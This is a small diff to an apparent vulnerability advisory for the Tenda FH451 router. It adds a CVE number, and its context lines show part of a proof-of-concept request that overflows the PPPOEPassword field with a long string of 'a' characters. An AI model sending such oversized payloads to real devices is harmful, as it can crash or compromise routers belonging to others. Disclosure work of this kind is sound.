@@ -1,5 +1,7 @@
 # FH451 Vulnerability
 
+CVE Number：CVE-2026-3678
+
 Vendor:Tenda
 
 Product:FH451 
@@ -49,4 +51,5 @@ wanmode=2&PPPOEPassword=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 
 
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
